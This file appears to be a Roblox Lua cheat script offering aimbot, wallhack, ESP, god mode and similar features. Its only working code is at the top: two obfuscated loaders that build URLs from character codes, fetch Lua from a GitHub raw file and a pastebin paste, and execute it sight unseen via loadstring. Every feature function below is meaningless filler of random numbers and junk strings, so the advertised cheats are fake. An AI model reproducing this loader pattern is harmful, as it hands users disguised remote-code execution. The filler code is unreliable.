-- Checkpoint 3.

local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109) .. string.char(47, 71, 108, 121, 112, 104, 65, 74, 74) .. string.char(47, 71, 108, 121, 112, 104, 72, 117, 98) .. string.char(47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110) .. string.char(47, 67, 104, 101, 99, 107, 112, 111, 105, 110, 116, 47, 80, 114, 101, 109, 105, 117, 109, 52, 46, 108, 117, 97)
local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
local _0x789abc = loadstring
_0x789abc(_0x4d5e6f)()

local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109) .. string.char(47, 114, 97, 119) .. string.char(47, 65, 55, 105, 77, 50, 82, 84, 89)
local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
local _0x789abc = loadstring
_0x789abc(_0x4d5e6f)()

local function enableAimbot()
    local _0x1234ab = math.random(1, 100)
    local _0x5678cd = math.random(1, 100)
    local _0x90abcdef = _0x1234ab * _0x5678cd
    if _0x90abcdef > 1000 then
        local _0x1a2b3c = string.char(65, 66, 67, 68)
        local _0x4d5e6f = string.reverse("aimbot")
        local _0x789abc = _0x1a2b3c .. _0x4d5e6f
        return _0x789abc
    end
end

local function disableAimbot()
    local _0x987654 = math.floor(math.random() * 100)
    local _0xabcdef = string.char(115, 116, 114, 105)
    if _0x987654 < 50 then
        local _0x567abc = string.gsub("aimbot_disabled", "aim", "off")
        return _0x567abc
    end
end

local function toggleWallhack()
    local _0x123456 = math.random(1, 999)
    local _0xabcdefg = string.sub("wallhacktoggle", 1, 5)
    local _0x098765 = _0x123456 * 0.5
    if _0x098765 < 500 then
        local _0x4567ab = string.char(119, 97, 108, 108)
        return _0x4567ab .. " hack"
    end
end

local function activateESP()
    local _0xabc123 = math.random(0, 100)
    local _0x987321 = math.random(1, 10)
    local _0x13579 = string.char(69, 83, 80)
    local _0x24680 = _0xabc123 * _0x987321
    if _0x24680 > 100 then
        local _0x987654321 = string.reverse("esp_active")
        return _0x13579 .. _0x987654321
    end
end

local function deactivateESP()
    local _0x1a2b3c = math.random(1, 100)
    local _0x4d5e6f = string.char(120, 116, 112)
    if _0x1a2b3c > 50 then
        local _0xabcdefg = string.lower("disableesp")
        return _0x4d5e6f .. _0xabcdefg
    end
end

local function enableSpeedHack()
    local _0x123456 = math.random(10, 50)
    local _0xabcdefg = math.random(1, 5)
    local _0x789abc = string.char(115, 112, 101, 101, 100)
    local _0x987654 = _0x123456 * _0xabcdefg
    if _0x987654 < 200 then
        return _0x789abc
    end
end

local function disableSpeedHack()
    local _0xabcdefg = string.reverse("disablespeed")
    local _0x1234567 = math.random(0, 10)
    if _0x1234567 > 5 then
        return _0xabcdefg
    end
end

local function toggleNoClip()
    local _0x1234ab = math.random(1, 100)
    local _0x5678cd = string.char(110, 111, 99, 108, 105, 112)
    if _0x1234ab > 50 then
        local _0x1a2b3c = string.gsub("noclip_on", "on", "off")
        return _0x5678cd .. _0x1a2b3c
    end
end

local function enableAutoClicker()
    local _0x13579 = math.random(10, 30)
    local _0x24680 = string.char(97, 117, 116, 111, 99, 108, 105, 107, 101)
    if _0x13579 > 15 then
        return _0x24680
    end
end

local function disableAutoClicker()
    local _0x24680 = math.random(1, 50)
    local _0xabcdefg = string.sub("autoclickeroff", 1, 5)
    if _0x24680 < 20 then
        return _0xabcdefg
    end
end

local function activateTeleport()
    local _0x24680 = math.random(1, 100)
    local _0x13579 = string.char(116, 101, 108, 101, 112, 111, 114, 116)
    if _0x24680 < 30 then
        return _0x13579
    end
end

local function deactivateTeleport()
    local _0xabcdefg = string.char(116, 101, 108, 101, 112, 111, 114, 116, 111, 102, 102)
    local _0x1234567 = math.random(1, 100)
    if _0x1234567 > 50 then
        return _0xabcdefg
    end
end

local function enableGodMode()
    local _0x123456 = string.char(103, 111, 100, 109, 111, 100)
    local _0xabcdefg = math.random(1, 5)
    if _0xabcdefg > 3 then
        return _0x123456
    end
end

local function disableGodMode()
    local _0x123abc = math.random(1, 100)
    local _0x456def = string.char(100, 105, 115, 97, 98, 108, 101)
    if _0x123abc < 60 then
        return _0x456def
    end
end

local function activateFastReload()
    local _0xabcdefg = string.char(114, 101, 108, 111, 97, 100)
    local _0x1234567 = math.random(0, 10)
    if _0x1234567 > 5 then
        return _0xabcdefg
    end
end

local function deactivateFastReload()
    local _0x123abc = math.random(1, 100)
    local _0x456def = string.char(102, 97, 115, 116)
    if _0x123abc < 50 then
        return _0x456def
    end
end

local function enableFlyHack()
    local _0x123abc = string.char(102, 108, 121, 104, 97, 99, 107)
    local _0x456def = math.random(1, 5)
    if _0x456def > 3 then
        return _0x123abc
    end
end

local function disableFlyHack()
    local _0x987654 = math.random(1, 10)
    local _0xabcdef = string.char(102, 108, 121, 104, 97, 99, 107)
    if _0x987654 < 5 then
        return _0xabcdef
    end
end

local function activateInfiniteAmmo()
    local _0x123abc = string.char(105, 110, 102, 105, 110, 105, 116, 101)
    local _0x456def = math.random(1, 100)
    if _0x456def > 50 then
        return _0x123abc
    end
end

local function deactivateInfiniteAmmo()
    local _0x789012 = string.char(115, 105, 116, 116, 101, 114)
    local _0x345678 = math.random(1, 100)
    if _0x345678 < 30 then
        return _0x789012
    end
end

local function enableSuperSpeed()
    local _0x123abc = math.random(1, 10)
    local _0x456def = string.char(115, 112, 101, 101, 100)
    if _0x123abc > 5 then
        return _0x456def
    end
end

local function enableSuperStrength()
    local _0x123abc = math.random(1, 10)
    local _0x456def = string.char(115, 116, 114, 101, 110, 103, 116, 104)
    if _0x123abc < 3 then
        return _0x456def
    end
end

local function disableSuperStrength()
    local _0x13579 = math.random(1, 100)
    local _0x24680 = string.char(115, 116, 111, 112, 101, 114)
    if _0x13579 > 50 then
        return _0x24680
    end
end

local function toggleUnlimitedHealth()
    local _0x123456 = math.random(1, 100)
    if _0x123456 > 60 then
        return string.char(117, 110, 108, 105, 109, 105, 116, 101, 104, 101, 97, 108, 116, 104)
    end
end

local function enablePerfectAccuracy()
    local _0x13579 = math.random(1, 10)
    if _0x13579 > 8 then
        return string.char(112, 101, 114, 102, 101, 99, 116, 97, 99, 99, 117, 114, 97, 99, 121)
    end
end

